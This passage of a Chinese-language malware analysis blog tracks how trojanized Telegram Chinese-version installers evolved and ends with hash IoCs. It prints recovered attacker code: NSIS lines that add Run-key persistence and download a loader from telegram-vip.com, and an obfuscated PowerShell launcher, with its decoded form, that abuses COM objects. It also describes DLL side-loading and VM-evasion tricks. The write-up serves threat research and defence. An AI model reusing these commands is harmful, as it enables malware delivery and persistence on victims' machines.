+<p>Advanced Installer 特別的資料夾名稱對應實際位置可參考官方文件：<a target="_blank" rel="noopener" href="https://www.advancedinstaller.com/user-guide/folder-paths.html">https://www.advancedinstaller.com/user-guide/folder-paths.html</a></p>
+</blockquote>
+<p>在安裝的過程中，除了將上述資料夾內的檔案放置到對應的位置以外，透過 Advanced Installer <a target="_blank" rel="noopener" href="https://www.advancedinstaller.com/user-guide/registry.html">Registry</a> 的設定將 payload 寫入到 <code>HKEY_CURRENT_USER\Software\&lt;COMPUTERNAME&gt;</code>，後續由 <code>AddInProcess.exe</code> 透過 .NET <code>Assembly.Load</code> 的方式載入。</p>
+<p>除此之外，也有部份樣本具備檢測虛擬機的能力，查閱 Advanced Installer 的官方文件後發現確實是有這個 <a target="_blank" rel="noopener" href="https://www.advancedinstaller.com/user-guide/launch-conditions-system.html">功能</a> 可以啟用的，開發者可以在 Launch Conditions 裡勾選 <code>Prevent running in virtual machines</code>。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p3.png" title="Figure 3. Advanced Installer 檢測到虛擬機環境拒絕安裝" data-caption="Figure 3. Advanced Installer 檢測到虛擬機環境拒絕安裝" data-fancybox="default"><img class="fig-img" src="p3.png" alt="Figure 3. Advanced Installer 檢測到虛擬機環境拒絕安裝"></a><span class="caption">Figure 3. Advanced Installer 檢測到虛擬機環境拒絕安裝</span></div>
+
+<h3 id="NSIS"><a href="#NSIS" class="headerlink" title="NSIS"></a>NSIS</h3><p>NSIS (<a target="_blank" rel="noopener" href="https://nsis.sourceforge.io/Main_Page">nullsoft scriptable install system</a>) 打包的安裝程式可以使用 7-zip 直接解壓縮就能得到還原的安裝腳本 [NSIS].nsi 以及打包的檔案。7-zip 在 9.33 的版本加入了自動反編譯 NSIS 腳本的功能，但又在 15.06 把這個功能拿掉了，所以要注意 7-zip 版本必須介於這兩者之間。</p>
+<h4 id="NSIS-Type-1"><a href="#NSIS-Type-1" class="headerlink" title="NSIS Type 1"></a>NSIS Type 1</h4><p>使用 NSIS 打包的第一種版本，基本上和使用 Advanced Installer 打包的型態內容大同小異。</p>
+<p>接下來的 NSIS Type2 和 Type3 便是前一篇文章 <a href="https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/">分析一個加料的 Telegram for Windows 中文版安裝程式</a> 所敘述的內容，但是額外發現了一些細節。</p>
+<h4 id="NSIS-Type-2"><a href="#NSIS-Type-2" class="headerlink" title="NSIS Type 2"></a>NSIS Type 2</h4><p>Type 2 和 Type 1 相比最大的不同在於，寫入機碼 <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> 實現持久化的動作不再經由釋放 <code>*.reg</code> 檔案之後再做匯入，而是使用 NSIS 腳本實現：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WriteRegStr HKCU Software\Microsoft\Windows\CurrentVersion\Run telegramCnService C:\PerfLog\AddInProcess.exe</span><br></pre></td></tr></table></figure>
+<p>但反而寫入 <code>HKEY_CURRENT_USER\Software\&lt;COMPUTERNAME&gt;</code> 的 payload 獨立成檔案 <code>ns.reg</code> 落地後再使用 NSIS 腳本呼叫 <code>regedit.exe</code> 匯入。</p>
+<p>NSIS 腳本片段：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Replace 123456 to &lt;ComputerName&gt; from ns.reg then use regedit.exe to import</span></span><br><span class="line">ReadRegStr <span class="variable">$R1</span> HKLM SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName ComputerName</span><br><span class="line">TextReplace::_FindInFile /NOUNLOAD <span class="variable">$INSTDIR</span>\ns.reg 123456 /S=1</span><br><span class="line">TextReplace::_ReplaceInFile /NOUNLOAD <span class="variable">$INSTDIR</span>\ns.reg <span class="variable">$INSTDIR</span>\ns.reg 123456 <span class="variable">$R1</span> <span class="string">&quot;/S=1 /C=1 /AO=1&quot;</span></span><br><span class="line">Exec <span class="string">&quot;regedit.exe /s $\&quot;<span class="variable">$INSTDIR</span>\ns.reg$\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="NSIS-Type-3"><a href="#NSIS-Type-3" class="headerlink" title="NSIS Type 3"></a>NSIS Type 3</h4><p>從 Type 3 開始，攻擊者不再把相關的惡意程式打包進安裝程式裡，相反的，所有的惡意程式在安裝過程中才會透過 NSIS 腳本額外下載下來。</p>
+<h5 id="NSIS-Type-3-1"><a href="#NSIS-Type-3-1" class="headerlink" title="NSIS Type 3-1"></a>NSIS Type 3-1</h5><p>其中又可以細分 Type 3-1，這個版本和 Type 2 相同，但相關的檔案在安裝過程才會額外下載下來。</p>
+<p>NSIS 腳本片段：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Download loader and registry file</span></span><br><span class="line">InetLoad::load /BANNER <span class="string">&quot;&quot;</span> <span class="string">&quot;Cameron Diaz download in progress, please wait ;)&quot;</span> http://www.telegram-vip.com/index2.php cnPath.exe</span><br><span class="line">InetLoad::load /BANNER <span class="string">&quot;&quot;</span> <span class="string">&quot;Cameron Diaz download in progress, please wait ;)&quot;</span> http://www.telegram-vip.com/index3.php ns.reg</span><br></pre></td></tr></table></figure>
+
+<p>這邊下載的 <code>cnPath.exe</code> 其實就是前面的 <code>AddInProcess.exe</code>，在 NSIS 腳本中也可以看到下載後將它重新命名放到指定的位置。</p>
+<p>NSIS 腳本片段：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Move $INSTDIR\cnPath.exe to C:\PerfLog\AddInProcess.exe</span></span><br><span class="line">StrCpy <span class="variable">$R0</span> <span class="variable">$INSTDIR</span>\cnPath.exe</span><br><span class="line">StrCpy <span class="variable">$R1</span> C:\PerfLog\AddInProcess.exe</span><br><span class="line">System::Call <span class="string">&quot;Kernel32::MoveFileA(t R0,t R1)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="NSIS-Type-3-2"><a href="#NSIS-Type-3-2" class="headerlink" title="NSIS Type 3-2"></a>NSIS Type 3-2</h5><p>Type 3-2 開始有了重大的改變，在安裝過程中一樣透過 NSIS 腳本下載一個解壓縮程式 <code>winzip.exe</code> 和一個壓縮檔，使用 <code>winzip.exe</code> 來解壓縮。</p>
+<p>另外，在這個版本也開始發現到使用合法程式搭配 DLL Side-Loading 來執行惡意程式的手法。例如 <code>066864a2eab99d8821025b976ea26280c86e7db584b02df1d6230b3e40786fde</code> 這個樣本會釋放以下的檔案：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// SHA256 066864a2eab99d8821025b976ea26280c86e7db584b02df1d6230b3e40786fde</span><br><span class="line">.</span><br><span class="line">├── cfwd2.dat           // used to verify</span><br><span class="line">├── cfwd3.dat           // used to verify</span><br><span class="line">├── gamecap.exe         // legitimate executable loader from 騰訊視頻 (QQLivePlayer.exe)</span><br><span class="line">├── module_cfg.bin      // payload</span><br><span class="line">├── QLMainModule.dll    // DLL Side-loading, with fake &quot;Google LLC&quot; certificate</span><br><span class="line">└── VMProtectSDK32.dll  // legitimate DLL</span><br></pre></td></tr></table></figure>
+<p>主程式 <code>gamecap.exe</code> 是一個來自騰訊的合法程式，會呼叫來自 <code>QLMainModule.dll</code> 的匯出函式 <code>QQLiveWinMain</code> 開始感染流程。第一次執行時首先檢查 mutex <code>gamecap</code> 是否存在，接著驗證 <code>cfwd2.dat</code> 的檔案內容，沒有問題的話便建立一個自己新的程序。接下來第二次執行時確認 mutex 已經存在，接著檢查 <code>cfwd3.dat</code> 和 <code>module_cfg.bin</code> 的檔案內容，沒有問題後才會透過 HTTP 請求下載後續要注入的 payload，在記憶體中載入執行。</p>
+<p>這裡 DLL Side-Loading 的程式來自騰訊只是其中一個例子，也可以是其他任意具有 DLL Side-Loading 弱點的程式。</p>
+<p>同時，這裡第一次看到 <code>VMProtectSDK32.dll</code>，攻擊者開始嘗試使用 VMProtect，這在後面會另外提到。</p>
+<h3 id="Windows-MFC"><a href="#Windows-MFC" class="headerlink" title="Windows MFC"></a>Windows MFC</h3><p>在 2020&#x2F;11&#x2F;24，我追蹤到使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/mfc/mfc-desktop-applications">Windows MFC</a> 框架重新撰寫的安裝程式。從這開始，感染流程又有了新的變化，並且開始加入了一些不一樣的規避手法。</p>
+<h4 id="MFC-Type-1"><a href="#MFC-Type-1" class="headerlink" title="MFC Type 1"></a>MFC Type 1</h4><p>從這個型態開始，攻擊者再次將大部分惡意程式包含在安裝程式中，在安裝期間釋放到指到位置，並且在樣本中嵌入 base64 字串來執行混淆的 powershell script。</p>
+<p>其中一種還原前的內容：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\cmd.exe /c <span class="string">&quot; echo\ -join ( ( 53,74 ,61 , 72, 74 , 20 , 43 ,&#x27;3a&#x27; , &#x27;5c&#x27; , 50,72 ,&#x27;6f&#x27;,67 ,72, 61, &#x27;6d&#x27;, 44,61 , 74 ,61,&#x27;5c&#x27; ,52 , 65,63 ,&#x27;6f&#x27; ,76,65,72,79,&#x27;5c&#x27;,73, 65, 74 ,75 ,70 , &#x27;2e&#x27; , 65, 78, 65 ,&#x27;3b&#x27; ,&#x27;5b&#x27;,53, 79 ,73 , 74 ,65 ,&#x27;6d&#x27;,&#x27;2e&#x27;, 41 , 63,74 , 69 , 76, 61 , 74 ,&#x27;6f&#x27; ,72,&#x27;5d&#x27;,&#x27;3a&#x27;, &#x27;3a&#x27;,43 , 72 ,65, 61 ,74,65 ,49 , &#x27;6e&#x27; , 73 ,74 , 61, &#x27;6e&#x27;, 63, 65, 28, &#x27;5b&#x27;,54,79 ,70 , 65, &#x27;5d&#x27; ,&#x27;3a&#x27;, &#x27;3a&#x27; ,47,65 ,74 , 54,79, 70,65,46,72 , &#x27;6f&#x27; ,&#x27;6d&#x27;, 43, &#x27;4c&#x27;, 53,49 , 44, 28 ,27, 39 , 42 , 41, 30 , 35,39 ,37 ,32 , &#x27;2d&#x27;, 46, 36,41, 38 , &#x27;2d&#x27; , 31,31 ,43 , 46,&#x27;2d&#x27; , 41 , 34 , 34, 32 ,&#x27;2d&#x27;,30 ,30 , 41 ,30,43 ,39,30 , 41, 38,46, 33 ,39 ,27,29 , 29 , &#x27;2e&#x27;,69 ,74, 65 , &#x27;6d&#x27; ,28, 29 , &#x27;2e&#x27; ,44 ,&#x27;6f&#x27; , 63 , 75 , &#x27;6d&#x27;, 65 , &#x27;6e&#x27;, 74, &#x27;2e&#x27; ,41 ,70,70, &#x27;6c&#x27; ,69 ,63, 61 ,74 , 69 ,&#x27;6f&#x27;, &#x27;6e&#x27;,&#x27;2e&#x27; ,53, 68 , 65 ,&#x27;6c&#x27; , &#x27;6c&#x27; , 45, 78, 65,63,75, 74,65 , 28,22, 61 ,74 ,74 , 72,69 , 62, &#x27;2e&#x27;, 65,78 ,65, 22,&#x27;2c&#x27; ,22,43 , &#x27;3a&#x27;,&#x27;5c&#x27;, 50,72,&#x27;6f&#x27;, 67,72 ,61 ,&#x27;6d&#x27;, 44, 61, 74, 61 , &#x27;5c&#x27; ,52 , 65 , 63 , &#x27;6f&#x27; ,76, 65 , 72 , 79,20,&#x27;2b&#x27;, 73, 20 , &#x27;2b&#x27; , 68 ,22,&#x27;2c&#x27;,22, 63 , &#x27;3a&#x27;,&#x27;2f&#x27; ,77,69, &#x27;6e&#x27; ,64, &#x27;6f&#x27; ,77,73,&#x27;2f&#x27;,73, 79 ,73 ,74,65, &#x27;6d&#x27;,33 ,32 ,22 ,&#x27;2c&#x27;,24 ,&#x27;6e&#x27;, 75 , &#x27;6c&#x27;, &#x27;6c&#x27;, &#x27;2c&#x27; ,30 , 29 ,&#x27;3b&#x27;, &#x27;5b&#x27;,53,79,73 , 74 , 65,&#x27;6d&#x27; , &#x27;2e&#x27;, 41, 63 , 74,69 , 76,61 ,74 , &#x27;6f&#x27;, 72, &#x27;5d&#x27; , &#x27;3a&#x27; , &#x27;3a&#x27; ,43, 72 , 65,61 ,74, 65,49, &#x27;6e&#x27; ,73 , 74, 61,&#x27;6e&#x27; , 63 ,65, 28, &#x27;5b&#x27;,54 , 79 ,70,65,&#x27;5d&#x27; , &#x27;3a&#x27;,&#x27;3a&#x27; , 47 ,65 ,74 ,54,79 ,70, 65 , 46,72, &#x27;6f&#x27; ,&#x27;6d&#x27; , 43 , &#x27;4c&#x27;,53, 49 ,44 ,28 , 27 ,39, 42 ,41, 30,35, 39 , 37, 32, &#x27;2d&#x27; ,46,36 ,41, 38, &#x27;2d&#x27; ,31 ,31 ,43 ,46 , &#x27;2d&#x27;, 41, 34,34 ,32 , &#x27;2d&#x27; , 30, 30 ,41 ,30 ,43 , 39,30,41 , 38, 46 ,33, 39 ,27,29, 29 ,&#x27;2e&#x27; ,69 ,74 , 65 ,&#x27;6d&#x27; ,28 ,29 ,&#x27;2e&#x27; , 44 ,&#x27;6f&#x27;,63,75,&#x27;6d&#x27;, 65,&#x27;6e&#x27;,74 , &#x27;2e&#x27; , 41, 70 , 70, &#x27;6c&#x27; , 69, 63 , 61 ,74 , 69 ,&#x27;6f&#x27;,&#x27;6e&#x27; ,&#x27;2e&#x27; ,53 ,68 , 65,&#x27;6c&#x27; , &#x27;6c&#x27; , 45,78,65,63 , 75 ,74 ,65 , 28,22 , 69 ,70, 63 ,&#x27;6f&#x27;,&#x27;6e&#x27; ,66, 69,67,&#x27;2e&#x27; ,65 , 78,65 ,22, &#x27;2c&#x27; ,22 ,&#x27;2f&#x27; ,72,65,&#x27;6c&#x27;, 65 , 61,73 ,65, 22, &#x27;2c&#x27; ,22 , 63,&#x27;3a&#x27;, &#x27;2f&#x27;, 77, 69, &#x27;6e&#x27;,64 , &#x27;6f&#x27; , 77 , 73 , &#x27;2f&#x27; , 73 , 79, 73 ,74,65, &#x27;6d&#x27; , 33 ,32,22 , &#x27;2c&#x27; , 24,&#x27;6e&#x27;,75,&#x27;6c&#x27;, &#x27;6c&#x27;,&#x27;2c&#x27;, 30,29 ,&#x27;3b&#x27; , 53 , 74, 61 , 72, 74 ,&#x27;2d&#x27; ,53 , &#x27;6c&#x27; , 65 ,65, 70 , 20 , &#x27;2d&#x27;, 53 ,65,63, &#x27;6f&#x27;,&#x27;6e&#x27; ,64 , 73,20 ,32, &#x27;3b&#x27; , &#x27;5b&#x27;,53 , 79, 73, 74,65,&#x27;6d&#x27;,&#x27;2e&#x27; ,41,63 ,74, 69 ,76 ,61, 74, &#x27;6f&#x27;, 72 , &#x27;5d&#x27; , &#x27;3a&#x27; ,&#x27;3a&#x27;, 43 , 72 , 65 , 61 , 74 , 65 ,49 ,&#x27;6e&#x27;,73 , 74 , 61,&#x27;6e&#x27; , 63 ,65,28 , &#x27;5b&#x27;,74 , 79, 70 ,65 , &#x27;5d&#x27; , &#x27;3a&#x27; , &#x27;3a&#x27;, 47 ,65 , 74,54 , 79 ,70 , 65 ,46 , 72 , &#x27;6f&#x27;,&#x27;6d&#x27;,50,72 , &#x27;6f&#x27;, 67 ,49 ,44,28 ,22 , &#x27;4d&#x27; , &#x27;4d&#x27;,43 , 32 , 30,&#x27;2e&#x27;,41 ,70 ,70 , &#x27;6c&#x27;, 69, 63,61 , 74, 69 , &#x27;6f&#x27; ,&#x27;6e&#x27; ,22 , 29 ,29 , &#x27;2e&#x27;,44, &#x27;6f&#x27; , 63 , 75 , &#x27;6d&#x27;, 65, &#x27;6e&#x27;,74,&#x27;2e&#x27;, 41,63 , 74, 69 , 76,65,56 , 69, 65 ,77, &#x27;2e&#x27;, 45 ,78 , 65,63, 75 ,74,65 ,53 , 68 ,65 ,&#x27;6c&#x27;,&#x27;6c&#x27;,43 , &#x27;6f&#x27; , &#x27;6d&#x27;,&#x27;6d&#x27;, 61,&#x27;6e&#x27; ,64, 28 , 22 ,43 , &#x27;3a&#x27;,&#x27;5c&#x27;, 50 ,72,&#x27;6f&#x27;, 67, 72 , 61 , &#x27;6d&#x27; , 44 , 61 ,74,61 , &#x27;5c&#x27;,52 ,65 , 63,&#x27;6f&#x27;, 76,65,72,79 ,&#x27;5c&#x27; , 53, 65, 72, 76 , 65, 72 , &#x27;2e&#x27;,76 ,62 ,65, 22,&#x27;2c&#x27; ,22 ,30,22, &#x27;2c&#x27;, 22, 30, 22, &#x27;2c&#x27;, 22, &#x27;4d&#x27;, 69 ,&#x27;6e&#x27;, 69 ,&#x27;6d&#x27;,69, &#x27;7a&#x27;,65 ,64, 22 , 29 , &#x27;3b&#x27;, 53,74 ,61, 72 , 74 , 20, 43, &#x27;3a&#x27; ,&#x27;5c&#x27; ,50, 72 ,&#x27;6f&#x27; , 67 , 72 ,61, &#x27;6d&#x27; ,44 , 61, 74, 61,&#x27;5c&#x27;,52, 65 , 63,&#x27;6f&#x27;,76,65, 72, 79 , &#x27;5c&#x27;, 67, 61, &#x27;6d&#x27; ,65 ,63 , 61 ,70 , &#x27;2e&#x27;, 65, 78 ,65, &#x27;3b&#x27;, 53 , 74, 61 , 72, 74 ,&#x27;2d&#x27; ,53 , &#x27;6c&#x27;, 65 , 65 ,70 ,20,&#x27;2d&#x27; ,53, 65 ,63, &#x27;6f&#x27; , &#x27;6e&#x27;,64,73 , 20, 32, &#x27;3b&#x27; , &#x27;5b&#x27; ,53 ,79 , 73 , 74,65 ,&#x27;6d&#x27; , &#x27;2e&#x27;, 41 ,63, 74,69,76,61, 74 ,&#x27;6f&#x27;, 72 , &#x27;5d&#x27; , &#x27;3a&#x27;,&#x27;3a&#x27;, 43, 72,65 , 61,74, 65 , 49,&#x27;6e&#x27; ,73,74, 61,&#x27;6e&#x27; ,63,65,28,&#x27;5b&#x27; ,54,79 ,70 ,65 ,&#x27;5d&#x27;,&#x27;3a&#x27; , &#x27;3a&#x27; , 47,65 , 74 ,54 , 79, 70 , 65,46 , 72, &#x27;6f&#x27;, &#x27;6d&#x27;,43 , &#x27;4c&#x27;, 53,49, 44,28, 27,39,42,41 , 30, 35,39 ,37,32 ,&#x27;2d&#x27;, 46 , 36, 41 , 38 ,&#x27;2d&#x27;,31, 31 , 43, 46,&#x27;2d&#x27;,41 ,34 ,34 , 32 ,&#x27;2d&#x27; ,30 ,30, 41,30 , 43,39 , 30 ,41 ,38, 46 , 33, 39 , 27,29,29, &#x27;2e&#x27; ,69 , 74,65 ,&#x27;6d&#x27; ,28,29 ,&#x27;2e&#x27; , 44, &#x27;6f&#x27;,63, 75, &#x27;6d&#x27; , 65,&#x27;6e&#x27;, 74 , &#x27;2e&#x27;, 41 ,70,70 , &#x27;6c&#x27; ,69 ,63 ,61 ,74,69 ,&#x27;6f&#x27;, &#x27;6e&#x27; ,&#x27;2e&#x27; , 53 , 68 ,65 , &#x27;6c&#x27; ,&#x27;6c&#x27; , 45 ,78,65 ,63 , 75, 74, 65 ,28,22, 69 , 70 , 63, &#x27;6f&#x27;, &#x27;6e&#x27;, 66 ,69, 67,&#x27;2e&#x27;, 65 , 78,65 ,22 , &#x27;2c&#x27; , 22 ,&#x27;2f&#x27;,72 , 65 , &#x27;6e&#x27;, 65 , 77,22 , &#x27;2c&#x27; ,22,63 ,&#x27;3a&#x27;,&#x27;2f&#x27; ,77, 69 ,&#x27;6e&#x27;, 64 ,&#x27;6f&#x27; ,77,73 , &#x27;2f&#x27;, 73 ,79,73, 74 , 65,&#x27;6d&#x27;,33 , 32 ,22, &#x27;2c&#x27;,24 , &#x27;6e&#x27; ,75 ,&#x27;6c&#x27;, &#x27;6c&#x27; ,&#x27;2c&#x27; , 30, 29 ) ^^^|foreach &#123; ([convert]::toint16( ([string]<span class="variable">$_</span> ) ,16) -as [char])&#125; ) ^^^| . ( <span class="variable">$shellid</span>[1]+<span class="variable">$shellid</span>[13]+&#x27;x&#x27;) | powershell -command <span class="variable">$executioncontext</span>.invokecommand.invokescript( <span class="variable">$&#123;input&#125;</span>)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>混淆的方式不只一種，這邊僅舉其中一種為例。</p>
+</blockquote>
+<p>還原後的內容：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start</span> C:\ProgramData\Recovery\setup.exe;</span><br><span class="line">[<span class="type">System.Activator</span>]::CreateInstance([<span class="type">Type</span>]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>)).item().Document.Application.ShellExecute(<span class="string">&quot;attrib.exe&quot;</span>,<span class="string">&quot;C:\ProgramData\Recovery +s +h&quot;</span>,<span class="string">&quot;c:/windows/system32&quot;</span>,<span class="variable">$null</span>,<span class="number">0</span>);</span><br><span class="line">[<span class="type">System.Activator</span>]::CreateInstance([<span class="type">Type</span>]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>)).item().Document.Application.ShellExecute(<span class="string">&quot;ipconfig.exe&quot;</span>,<span class="string">&quot;/release&quot;</span>,<span class="string">&quot;c:/windows/system32&quot;</span>,<span class="variable">$null</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">2</span>;</span><br><span class="line">[<span class="type">System.Activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>)).Document.ActiveView.ExecuteShellCommand(<span class="string">&quot;C:\ProgramData\Recovery\Server.vbe&quot;</span>,<span class="string">&quot;0&quot;</span>,<span class="string">&quot;0&quot;</span>,<span class="string">&quot;Minimized&quot;</span>);</span><br><span class="line"><span class="built_in">Start</span> C:\ProgramData\Recovery\gamecap.exe;</span><br><span class="line"><span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">2</span>;</span><br><span class="line">[<span class="type">System.Activator</span>]::CreateInstance([<span class="type">Type</span>]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>)).item().Document.Application.ShellExecute(<span class="string">&quot;ipconfig.exe&quot;</span>,<span class="string">&quot;/renew&quot;</span>,<span class="string">&quot;c:/windows/system32&quot;</span>,<span class="variable">$null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>這裡可以看到攻擊者首次使用 Windows COM 物件來提權執行命令，相關的攻擊手法可參考：<a target="_blank" rel="noopener" href="https://dl.packetstormsecurity.net/papers/general/abusing-objects.pdf">Abusing COM &amp; DCOM objects</a>。</p>
+<p>其他行為大致和前一型態相同，持久化的手法仍然是透過放置捷徑到 Startup Menu 的方式，魔改過的 gh0st RAT 本體會在後門執行時才會下載並載入到記憶體中執行。</p>
+<h4 id="MFC-Type-2"><a href="#MFC-Type-2" class="headerlink" title="MFC Type 2"></a>MFC Type 2</h4><p>Type 2 與 Type 1 最大的不同在於，捨棄了使用 base64 編碼的 powershell script，將所有內容內化到安裝程式的程式的邏輯中，並且使用 Stack String 搭配 XOR 等基本位元運算來隱藏相關的所有路徑 &#x2F; 檔案字串。除此之外，原先經由 powershell script 濫用 COM 物件的手法也獨立成一個新的執行檔 <code>go.exe</code>，負責提權並且開始載入惡意程式的相關流程。</p>
+<p>Type 2 最大的亮點在於，攻擊者在使用 Advance Installer 打包的樣本中曾經出現過檢測虛擬機環境的行為後，這次的型態再一次的加入了檢測虛擬機環境的動作，靠的是 WMI script 來檢測 CPU 的溫度。這個反虛擬機的手法在 2018 年的時候就有一個名為 GravityRAT 的惡意程式使用過，對該程式的分析可以參考 <a target="_blank" rel="noopener" href="https://www.andreafortuna.org/2018/05/21/malware-vm-detection-techniques-evolving-an-analysis-of-gravityrat/">Malware VM detection techniques evolving: an analysis of GravityRAT</a>。基本上 Hyper-V, VMWare Fusion, VirtualBox, KVM 或 XEN 都沒有支援這個監控資料，但是這個手法並不是完美的，文中也提到一些近期的硬體設備也同樣不支援提供 CPU 的溫度資料，這會使這個手法將實體機器誤認為是虛擬機從而躲過一劫，安裝程式開始執行後一旦偵測到處於虛擬機環境或是 debugger 環境，便會直接結束。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p4.png" title="Figure 4. 在虛擬機中無法取得 CPU 溫度" data-caption="Figure 4. 在虛擬機中無法取得 CPU 溫度" data-fancybox="default"><img class="fig-img" src="p4.png" alt="Figure 4. 在虛擬機中無法取得 CPU 溫度"></a><span class="caption">Figure 4. 在虛擬機中無法取得 CPU 溫度</span></div>
+
+
+<h3 id="Software-Packer"><a href="#Software-Packer" class="headerlink" title="Software Packer"></a>Software Packer</h3><p>在 2020&#x2F;12&#x2F;22 ~ 2020&#x2F;12&#x2F;24 這個期間內（compile time），曾經發現 5 個樣本使用了 <a target="_blank" rel="noopener" href="https://vmpsoft.com/">VMProtect</a> 或 <a target="_blank" rel="noopener" href="http://www.safengine.com/downloads/get-demo">Safengin Shielden</a> 做了加殼處理，其保護的內容為上述的 MFC Type。攻擊者可能是實驗性的使用加殼手段來防護原始碼或阻礙分析，在 2020&#x2F;12&#x2F;26 新追蹤到的樣本又不再使用加殼保護以後，截至撰寫本文時尚未發現其他有加殼的樣本。</p>
+<h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>在這篇文章發佈時（2021&#x2F;01&#x2F;20），其實已經又追蹤到幾個更新的樣本，但再累積下去會一次寫太多內容，就先以近三個月前幾種大的型態為主來分享整個改變的過程。</p>
+<p>在短短三個月內時間內，可以看到背後的攻擊者非常積極的在更新惡意程式，其感染手法雖然大同小異，但是規避的手法或是反調查的手段卻是越改越成熟。偽造通訊軟體網站只是看門狗集團的其中一個攻擊手段，其他還有釣魚郵件 &#x2F; 直接 Telegram 群組散播惡意程式等。近來 Telegram 的中文使用者人數增加，有鑑於官方並沒有提供中文版的界面，很多人便開始尋找中文化的解決方案，正好中了攻擊者的意，透過 Google 廣告和網站 SEO，使用者會很容易搜尋或是直接在廣告看到，遭到誘騙上當。</p>
+<div class="figure center" style="width:;"><a class="fancybox" href="p5.jpg" title="Figure 5. 出現在 Google 廣告的內容" data-caption="Figure 5. 出現在 Google 廣告的內容" data-fancybox="default"><img class="fig-img" src="p5.jpg" alt="Figure 5. 出現在 Google 廣告的內容"></a><span class="caption">Figure 5. 出現在 Google 廣告的內容</span></div>
+
+<div class="figure center" style="width:;"><a class="fancybox" href="p6.png" title="Figure 6. 目前偽造網站的截圖" data-caption="Figure 6. 目前偽造網站的截圖" data-fancybox="default"><img class="fig-img" src="p6.png" alt="Figure 6. 目前偽造網站的截圖"></a><span class="caption">Figure 6. 目前偽造網站的截圖</span></div>
+
+
+
+<p>這個攻擊行動仍然還在持續進行中，攻擊者也還在不斷更新他們的惡意程式，未來應該還有機會有下一篇文章 :)</p>
+<h2 id="附件：IoCs"><a href="#附件：IoCs" class="headerlink" title="附件：IoCs"></a>附件：IoCs</h2><p>Advanced Installer</p>
+<ul>
+<li><code>0bf579a9c7c6a4b0dc58ab5372699b04601a783ea5f33fa62e4100b41be1e55f</code></li>
+<li><code>1f6e6d81d77ccb5bb0e7e2264f1fa021faad244ac68e942930e57133ee6da976</code></li>
+<li><code>56081f073519f7929c79bf8b88a4e4c257b31d67f8df9fa3f3d1793ee3da91d7</code></li>
+</ul>
+<p>NSIS Type 1</p>
+<ul>
+<li><code>971ca26b8e1e4e0cd9b009812f0084ade65174e9f4d1579fd05ae011225b1e7e</code></li>
+</ul>
+<p>NSIS Type 2</p>
+<ul>
+<li><code>1d6677b629e65e6a9341686c5d219f07383b496c8796bcf8630f5dde96dbbad3</code></li>
+<li><code>1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8</code></li>
+<li><code>214a3a1ac1f42a49bf837e2d1d76ff53e6db759032206156e01f78d9db1011f5</code></li>
+<li><code>2a127b774d59ba560bc6131b84a71b8e3535be41c1c4b10fc8084724b2dded92</code></li>
+<li><code>c6f5aa44b385578e2876a2aa6d1e9186cae54dc359164a03a8bcd2bb59dbce8f</code></li>
+<li><code>f6c622b152b6d4fa362d2900eba8934dcae3f3d958b792524cf48bcbc7d08140</code></li>
+</ul>
+<p>NSIS Type 3-1</p>
+<ul>
+<li><code>35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba</code></li>
+<li><code>57dd6a698440752a4b5a26e497531ebfdd6bc565c265652b60f29a505481286a</code></li>
+</ul>
+<p>NSIS Type 3-2</p>
+<ul>
+<li><code>273c9116367bd5d6c6e5b40b0ad287776b34db67d5656cf985c5761d3ea1714c</code></li>
+<li><code>340aa68450e42c11c8835739024b5d221a7793b1450e014f33cc99fe1d08fc51</code></li>
